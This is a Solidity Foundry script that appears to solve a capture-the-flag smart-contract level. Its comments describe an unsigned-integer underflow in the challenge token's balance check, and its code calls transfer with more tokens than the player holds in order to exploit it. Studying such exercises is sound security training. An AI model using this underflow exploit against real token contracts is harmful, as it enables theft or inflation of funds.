// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import {Script} from "../lib/forge-std/src/Script.sol";

interface Token {
    function transfer(address _to, uint256 _value) external returns (bool);
}

contract TokenScriptContract is Script{
    function run() external {
        vm.startBroadcast();

        // for the old solidity version , uint256 can't be less than 0 , so that below condition will always be true
        // require(balances[msg.sender] - _value >= 0)

        // the address value is got from executing `instance` in chrome console
        Token t = Token(0x8fD0040D51773cF4F05CC8a71Cc7035F86b0049B);
        // the address that execute this function is `player` , send 21 toke to anyone else
        t.transfer(address(0), 21);

        vm.stopBroadcast();
    }
}